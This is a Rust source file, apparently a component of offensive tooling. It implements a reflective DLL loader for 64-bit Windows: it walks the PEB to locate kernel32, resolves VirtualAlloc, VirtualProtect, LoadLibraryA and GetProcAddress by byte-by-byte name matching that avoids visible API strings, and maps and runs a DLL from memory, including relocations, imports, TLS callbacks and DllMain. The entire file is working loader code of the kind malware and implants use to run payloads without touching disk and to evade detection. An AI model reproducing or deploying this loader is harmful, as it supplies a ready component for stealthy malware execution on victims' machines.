#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::ffi::c_void;

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_cblp: u16, e_cp: u16, e_crlc: u16, e_cparhdr: u16, e_minalloc: u16, e_maxalloc: u16,
    e_ss: u16, e_sp: u16, e_csum: u16, e_ip: u16, e_cs: u16, e_lfarlc: u16, e_ovno: u16,
    e_res: [u16; 4], e_oemid: u16, e_oeminfo: u16, e_res2: [u16; 10], e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    Machine: u16, NumberOfSections: u16, TimeDateStamp: u32, PointerToSymbolTable: u32,
    NumberOfSymbols: u32, SizeOfOptionalHeader: u16, Characteristics: u16,
}

#[repr(C)]
struct IMAGE_DATA_DIRECTORY { VirtualAddress: u32, Size: u32 }

const IMAGE_NUMBEROF_DIRECTORY_ENTRIES: usize = 16;

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16, MajorLinkerVersion: u8, MinorLinkerVersion: u8, SizeOfCode: u32,
    SizeOfInitializedData: u32, SizeOfUninitializedData: u32, AddressOfEntryPoint: u32,
    BaseOfCode: u32, ImageBase: u64, SectionAlignment: u32, FileAlignment: u32,
    MajorOperatingSystemVersion: u16, MinorOperatingSystemVersion: u16, MajorImageVersion: u16,
    MinorImageVersion: u16, MajorSubsystemVersion: u16, MinorSubsystemVersion: u16,
    Win32VersionValue: u32, SizeOfImage: u32, SizeOfHeaders: u32, CheckSum: u32,
    Subsystem: u16, DllCharacteristics: u16, SizeOfStackReserve: u64, SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64, SizeOfHeapCommit: u64, LoaderFlags: u32, NumberOfRvaAndSizes: u32,
    DataDirectory: [IMAGE_DATA_DIRECTORY; IMAGE_NUMBEROF_DIRECTORY_ENTRIES],
}

#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    Signature: u32, FileHeader: IMAGE_FILE_HEADER, OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
struct IMAGE_SECTION_HEADER {
    Name: [u8; 8], VirtualSize: u32, VirtualAddress: u32, SizeOfRawData: u32,
    PointerToRawData: u32, PointerToRelocations: u32, PointerToLinenumbers: u32,
    NumberOfRelocations: u16, NumberOfLinenumbers: u16, Characteristics: u32,
}

#[repr(C)]
struct IMAGE_IMPORT_DESCRIPTOR {
    OriginalFirstThunk: u32, TimeDateStamp: u32, ForwarderChain: u32, Name: u32, FirstThunk: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct IMAGE_THUNK_DATA64 { AddressOfData: u64 }

#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    Characteristics: u32, TimeDateStamp: u32, MajorVersion: u16, MinorVersion: u16, Name: u32,
    Base: u32, NumberOfFunctions: u32, NumberOfNames: u32, AddressOfFunctions: u32,
    AddressOfNames: u32, AddressOfNameOrdinals: u32,
}

#[repr(C)]
struct IMAGE_BASE_RELOCATION { VirtualAddress: u32, SizeOfBlock: u32 }

const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x00004550;
const IMAGE_NT_OPTIONAL_HDR64_MAGIC: u16 = 0x020B;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
const IMAGE_DIRECTORY_ENTRY_TLS: usize = 4;
const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;
const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;

type VaFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
type VfFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
type VpFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type LlFn = unsafe extern "system" fn(*const u8) -> *mut c_void;
type GpFn = unsafe extern "system" fn(*mut c_void, *const u8) -> *mut c_void;

struct K32 {
    base: *mut u8,
    virt_alloc: VaFn,
    virt_free: VfFn,
    virt_protect: VpFn,
    load_lib_a: LlFn,
    get_proc_addr: GpFn,
}

unsafe fn name_eq8(p: *const u8, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8) -> bool {
    *(p.add(0)) == a && *(p.add(1)) == b && *(p.add(2)) == c && *(p.add(3)) == d &&
    *(p.add(4)) == e && *(p.add(5)) == f && *(p.add(6)) == g && *(p.add(7)) == h
}
unsafe fn name_eq12(p: *const u8, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8) -> bool {
    name_eq8(p, a, b, c, d, e, f, g, h) &&
    *(p.add(8)) == i && *(p.add(9)) == j && *(p.add(10)) == k && *(p.add(11)) == l
}
unsafe fn name_eq14(p: *const u8, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8, m: u8, n: u8) -> bool {
    name_eq12(p, a, b, c, d, e, f, g, h, i, j, k, l) &&
    *(p.add(12)) == m && *(p.add(13)) == n
}
unsafe fn name_eq21(p: *const u8, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8, m: u8, n: u8, o: u8, q: u8, r: u8, s: u8, t: u8, u_u: u8, v: u8) -> bool {
    name_eq14(p, a, b, c, d, e, f, g, h, i, j, k, l, m, n) &&
    *(p.add(14)) == o && *(p.add(15)) == q && *(p.add(16)) == r && *(p.add(17)) == s &&
    *(p.add(18)) == t && *(p.add(19)) == u_u && *(p.add(20)) == v
}

unsafe fn is_flush_instruction_cache(p: *const u8) -> bool {
    name_eq21(p, b'F',b'l',b'u',b's',b'h',b'I',b'n',b's',b't',b'r',b'u',b'c',b't',b'i',b'o',b'n',b'C',b'a',b'c',b'h',b'e') && *(p.add(21)) == 0
}

unsafe fn w16_eq(p: *const u16, a0: u16, a1: u16, a2: u16, a3: u16, a4: u16, a5: u16, a6: u16, a7: u16, a8: u16) -> bool {
    *p == a0 && *(p.add(1)) == a1 && *(p.add(2)) == a2 && *(p.add(3)) == a3 &&
    *(p.add(4)) == a4 && *(p.add(5)) == a5 && *(p.add(6)) == a6 && *(p.add(7)) == a7 && *(p.add(8)) == a8
}

unsafe fn find_k32_base() -> Option<*mut u8> {
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(0x18) as *const *mut u8);
    let flink = *(ldr.add(0x10) as *const *mut u8);
    let mut entry = flink;
    let head = ldr.add(0x10);
    loop {
        let b = *(entry.add(0x30) as *const *mut u8);
        let p = *(entry.add(0x60) as *const *mut u16);
        // Case-insensitive check: KERNEL32 or kernel32
        let c0 = *p; let c1 = *(p.add(1)); let c2 = *(p.add(2)); let c3 = *(p.add(3));
        let c4 = *(p.add(4)); let c5 = *(p.add(5)); let c6 = *(p.add(6));
        let c7 = *(p.add(7)); let c8 = *(p.add(8)); let c9 = *(p.add(9));
        let c10 = *(p.add(10)); let c11 = *(p.add(11)); let c12 = *(p.add(12));
        let ok = (c0 == 0x4B || c0 == 0x6B) && (c1 == 0x45 || c1 == 0x65) &&
                 (c2 == 0x52 || c2 == 0x72) && (c3 == 0x4E || c3 == 0x6E) &&
                 (c4 == 0x45 || c4 == 0x65) && (c5 == 0x4C || c5 == 0x6C) &&
                 (c6 == 0x33) && (c7 == 0x32) && (c8 == 0x2E) &&
                 (c9 == 0x44 || c9 == 0x64) && (c10 == 0x4C || c10 == 0x6C) &&
                 (c11 == 0x4C || c11 == 0x6C) && (c12 == 0x00);
        if ok { return Some(b); }
        let next = *(entry as *const *mut u8);
        if next == head { return None; }
        entry = next;
    }
}

unsafe fn find_export(base: *mut u8, name_fn: unsafe fn(*const u8) -> bool) -> Option<*mut c_void> {
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return None; }
    let nt = base.add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE { return None; }
    let edir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if edir.VirtualAddress == 0 { return None; }
    let exp = base.add(edir.VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let functions = base.add((*exp).AddressOfFunctions as usize) as *const u32;
    let names = base.add((*exp).AddressOfNames as usize) as *const u32;
    let ordinals = base.add((*exp).AddressOfNameOrdinals as usize) as *const u16;
    for i in 0..(*exp).NumberOfNames {
        let np = base.add(*names.add(i as usize) as usize) as *const u8;
        let ord = *ordinals.add(i as usize) as usize;
        if name_fn(np) { return Some(base.add(*functions.add(ord) as usize) as *mut c_void); }
    }
    None
}

unsafe fn is_virtual_alloc(p: *const u8) -> bool {
    name_eq12(p, b'V', b'i', b'r', b't', b'u', b'a', b'l', b'A', b'l', b'l', b'o', b'c') && *(p.add(12)) == 0
}
unsafe fn is_virtual_free(p: *const u8) -> bool {
    name_eq8(p, b'V', b'i', b'r', b't', b'u', b'a', b'l', b'F') &&
    *(p.add(8)) == b'r' && *(p.add(9)) == b'e' && *(p.add(10)) == b'e' && *(p.add(11)) == 0
}
unsafe fn is_virtual_protect(p: *const u8) -> bool {
    name_eq14(p, b'V', b'i', b'r', b't', b'u', b'a', b'l', b'P', b'r', b'o', b't', b'e', b'c', b't') && *(p.add(14)) == 0
}
unsafe fn is_load_library_a(p: *const u8) -> bool {
    name_eq12(p, b'L', b'o', b'a', b'd', b'L', b'i', b'b', b'r', b'a', b'r', b'y', b'A') && *(p.add(12)) == 0
}
unsafe fn is_get_proc_address(p: *const u8) -> bool {
    name_eq14(p, b'G', b'e', b't', b'P', b'r', b'o', b'c', b'A', b'd', b'd', b'r', b'e', b's', b's') && *(p.add(14)) == 0
}

unsafe fn resolve_k32() -> Option<K32> {
    let base = find_k32_base()?;

    Some(K32 {
        base,
        virt_alloc: std::mem::transmute(find_export(base, is_virtual_alloc)?),
        virt_free: std::mem::transmute(find_export(base, is_virtual_free)?),
        virt_protect: std::mem::transmute(find_export(base, is_virtual_protect)?),
        load_lib_a: std::mem::transmute(find_export(base, is_load_library_a)?),
        get_proc_addr: std::mem::transmute(find_export(base, is_get_proc_address)?),
    })
}

// name_eq11 helper
unsafe fn name_eq11(p: *const u8, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8) -> bool {
    name_eq8(p, a, b, c, d, e, f, g, h) &&
    *(p.add(8)) == i && *(p.add(9)) == j && *(p.add(10)) == k
}

unsafe fn find_pe(data: *const u8) -> *const IMAGE_NT_HEADERS64 {
    let dos = data as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return std::ptr::null(); }
    let nt = data.add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE { return std::ptr::null(); }
    if (*nt).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC { return std::ptr::null(); }
    nt
}

#[no_mangle]
pub unsafe extern "C" fn ReflectiveLoader(dll_bytes: *const u8, k32_base: *mut u8) -> *mut c_void {
    if dll_bytes.is_null() { return std::ptr::null_mut(); }
    let k32_base = if !k32_base.is_null() {
        k32_base
    } else {
        match find_k32_base() {
            Some(base) => base,
            None => {
                std::ptr::write_volatile(dll_bytes.add(4) as *mut u32, 0xDEADBEEF);
                return 0x10001 as *mut c_void;
            }
        }
    };
    let dbg = dll_bytes.add(4) as *mut u32;
    std::ptr::write_volatile(dbg, 0xDEAD0001);

    std::ptr::write_volatile(dbg, 0xDEAD0003);
    let va = find_export(k32_base, is_virtual_alloc);
    let vf = find_export(k32_base, is_virtual_free);
    let vp = find_export(k32_base, is_virtual_protect);
    let ll = find_export(k32_base, is_load_library_a);
    let gp = find_export(k32_base, is_get_proc_address);
    if va.is_none() || vf.is_none() || vp.is_none() || ll.is_none() || gp.is_none() {
        std::ptr::write_volatile(dbg, 0xDEA50000);
        return 0x10002 as *mut c_void;
    }
    std::ptr::write_volatile(dbg, 0xDEAD0004);
    let k32 = K32 {
        base: k32_base,
        virt_alloc: std::mem::transmute(va.unwrap_unchecked()),
        virt_free: std::mem::transmute(vf.unwrap_unchecked()),
        virt_protect: std::mem::transmute(vp.unwrap_unchecked()),
        load_lib_a: std::mem::transmute(ll.unwrap_unchecked()),
        get_proc_addr: std::mem::transmute(gp.unwrap_unchecked()),
    };

    super::G_K32_BASE = k32_base;

    let nt = find_pe(dll_bytes);
    if nt.is_null() { std::ptr::write_volatile(dbg, 0xDEA10003); return 0x10003 as *mut c_void; }
    std::ptr::write_volatile(dbg, 0xDEAD0005);
    let opt = &(*nt).OptionalHeader;
    let sections = (nt as *const u8).add(4 + 20 + (*nt).FileHeader.SizeOfOptionalHeader as usize) as *const IMAGE_SECTION_HEADER;

    std::ptr::write_volatile(dbg, 0xDEAD0006);
    let image_base = (k32.virt_alloc)(std::ptr::null_mut(), opt.SizeOfImage as usize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if image_base.is_null() { std::ptr::write_volatile(dbg, 0xDEA10004); return 0x10004 as *mut c_void; }
    std::ptr::write_volatile(dbg, 0xDEAD0077);
    if opt.SizeOfHeaders as u64 > 0x1000000 { std::ptr::write_volatile(dbg, 0xDEA20077); return 0x10005 as *mut c_void; }
    std::ptr::write_volatile(dbg, 0xDEAD0007);
    // Manual byte copy for headers
    let hdr_sz = opt.SizeOfHeaders as usize;
    std::ptr::write_volatile(dbg, 0xDEA00000 | (hdr_sz as u32 & 0xFFFF));
    for off in 0..hdr_sz {
        *((image_base as *mut u8).add(off)) = *((dll_bytes as *const u8).add(off));
    }
    std::ptr::write_volatile(dbg, 0xDEAD007A);
    let num_sects = (*nt).FileHeader.NumberOfSections as usize;
    std::ptr::write_volatile(dbg, 0xDEAD0078);
    for i in 0..num_sects {
        std::ptr::write_volatile(dbg, 0xDEAD0008 | (i as u32 & 0xFF));
        let section = &*sections.add(i);
        if section.SizeOfRawData == 0 || section.PointerToRawData == 0 { continue; }
        std::ptr::write_volatile(dbg, 0xDEAD0018 | (i as u32 & 0xFF));
        let sz = section.SizeOfRawData as usize;
        if sz > 0x100000 { std::ptr::write_volatile(dbg, 0xDEB00000 | (sz as u32 & 0xFFFF)); return 0x10006 as *mut c_void; }
        let src = dll_bytes.add(section.PointerToRawData as usize);
        let dst = image_base.add(section.VirtualAddress as usize) as *mut u8;
        for off in 0..sz {
            *dst.add(off) = *src.add(off);
        }
    }

    std::ptr::write_volatile(dbg, 0xDEAD0009);
    let reloc_dir = &opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if reloc_dir.VirtualAddress != 0 {
        let delta = (image_base as u64).wrapping_sub(opt.ImageBase);
        if delta != 0 { apply_relocations(image_base, reloc_dir, delta); }
    }

    std::ptr::write_volatile(dbg, 0xDEAD000A);
    let import_dir = &opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if import_dir.VirtualAddress != 0 { resolve_imports(image_base, import_dir, &k32); }

    std::ptr::write_volatile(dbg, 0xDEAD000B);
    let mut old_protect: u32 = 0;
    for i in 0..(*nt).FileHeader.NumberOfSections as usize {
        let section = &*sections.add(i);
        let base = image_base.add(section.VirtualAddress as usize);
        let mut protect: u32 = PAGE_NOACCESS;
        let c = section.Characteristics;
        if c & IMAGE_SCN_MEM_EXECUTE != 0 {
            protect = if c & IMAGE_SCN_MEM_WRITE != 0 { PAGE_EXECUTE_READWRITE }
            else if c & IMAGE_SCN_MEM_READ != 0 { PAGE_EXECUTE_READ } else { PAGE_EXECUTE };
        } else if c & IMAGE_SCN_MEM_WRITE != 0 { protect = PAGE_READWRITE; }
        else if c & IMAGE_SCN_MEM_READ != 0 { protect = PAGE_READONLY; }
        if section.VirtualSize > 0 {
            let size = std::cmp::max(section.VirtualSize, section.SizeOfRawData) as usize;
            (k32.virt_protect)(base, size, protect, &mut old_protect);
        }
    }

    std::ptr::write_volatile(dbg, 0xDEAD000C);
    let tls_dir = &opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if tls_dir.VirtualAddress != 0 { call_tls_callbacks(image_base, tls_dir, &k32); }

    std::ptr::write_volatile(dbg, 0xDEAD000D);
    let entry_point = opt.AddressOfEntryPoint;
    if entry_point != 0 {
        let dll_main: extern "system" fn(*mut c_void, u32, *mut c_void) -> bool =
            std::mem::transmute(image_base.add(entry_point as usize));
        let _ = dll_main(image_base as *mut c_void, 1, std::ptr::null_mut());
    }

    std::ptr::write_volatile(dbg, 0xDEAD000E);
    let flush_ptr = find_export(k32.base, is_flush_instruction_cache);
    let flush_fn: Option<unsafe extern "system" fn(*mut c_void, *mut c_void, usize) -> i32> = if flush_ptr.is_some() {
        Some(std::mem::transmute(flush_ptr.unwrap_unchecked()))
    } else { None };
    if let Some(flush) = flush_fn {
        flush(0xffffffffffffffffu64 as *mut c_void, image_base, opt.SizeOfImage as usize);
    }

    std::ptr::write_volatile(dbg, 0xDEAD000F);
    image_base
}

unsafe fn apply_relocations(image_base: *mut c_void, reloc_dir: &IMAGE_DATA_DIRECTORY, delta: u64) {
    let mut offset = 0usize;
    while offset < reloc_dir.Size as usize {
        let block = image_base.add(reloc_dir.VirtualAddress as usize + offset) as *const IMAGE_BASE_RELOCATION;
        let total = (*block).SizeOfBlock as usize;
        let base_rva = (*block).VirtualAddress;
        let entries_count = (total.saturating_sub(8)) / 2;
        let entries = (block as *const u8).add(8) as *const u16;
        for i in 0..entries_count {
            let val = *entries.add(i);
            let ty = (val >> 12) & 0xF;
            let rva_off = (val & 0xFFF) as usize;
            if ty == IMAGE_REL_BASED_DIR64 as u16 {
                let patch_addr = image_base.add(base_rva as usize + rva_off) as *mut u64;
                *patch_addr = (*patch_addr).wrapping_add(delta);
            }
        }
        offset += total;
    }
}

unsafe fn resolve_imports(image_base: *mut c_void, import_dir: &IMAGE_DATA_DIRECTORY, k32: &K32) {
    let mut desc_index = 0usize;
    loop {
        let desc = image_base.add(import_dir.VirtualAddress as usize + desc_index) as *const IMAGE_IMPORT_DESCRIPTOR;
        if (*desc).OriginalFirstThunk == 0 && (*desc).FirstThunk == 0 { break; }
        let hmod = (k32.load_lib_a)(image_base.add((*desc).Name as usize) as *const u8);
        if hmod.is_null() { desc_index += 20; continue; }
        let orig_thunk = image_base.add((*desc).OriginalFirstThunk as usize) as *const IMAGE_THUNK_DATA64;
        let first_thunk = image_base.add((*desc).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
        let mut thunk_index = 0usize;
        loop {
            let orig = *orig_thunk.add(thunk_index);
            if orig.AddressOfData == 0 { break; }
            if orig.AddressOfData & 0x8000000000000000u64 != 0 {
                let ordinal = orig.AddressOfData & 0xFFFF;
                let func = (k32.get_proc_addr)(hmod, ordinal as *const u8);
                if !func.is_null() { (*first_thunk.add(thunk_index)).AddressOfData = func as u64; }
            } else {
                let name_ptr = image_base.add(orig.AddressOfData as usize).add(2);
                let func = (k32.get_proc_addr)(hmod, name_ptr as *const u8);
                if !func.is_null() { (*first_thunk.add(thunk_index)).AddressOfData = func as u64; }
            }
            thunk_index += 1;
        }
        desc_index += 20;
    }
}

unsafe fn call_tls_callbacks(image_base: *mut c_void, tls_dir: &IMAGE_DATA_DIRECTORY, _k32: &K32) {
    let tls = image_base.add(tls_dir.VirtualAddress as usize) as *const IMAGE_TLS_DIRECTORY64;
    if (*tls).AddressOfCallBacks == 0 { return; }
    let arr = (*tls).AddressOfCallBacks as *const *mut c_void;
    let mut i = 0usize;
    loop {
        let fn_ptr = *arr.add(i);
        if fn_ptr.is_null() { break; }
        let cb: extern "system" fn(*mut c_void, u32, *mut c_void) = std::mem::transmute(fn_ptr);
        let _ = cb(image_base, 1, std::ptr::null_mut());
        i += 1;
    }
}

#[repr(C)]
struct IMAGE_TLS_DIRECTORY64 {
    StartAddressOfRawData: u64, EndAddressOfRawData: u64, AddressOfIndex: u64,
    AddressOfCallBacks: u64, SizeOfZeroFill: u32, Characteristics: u32,
}
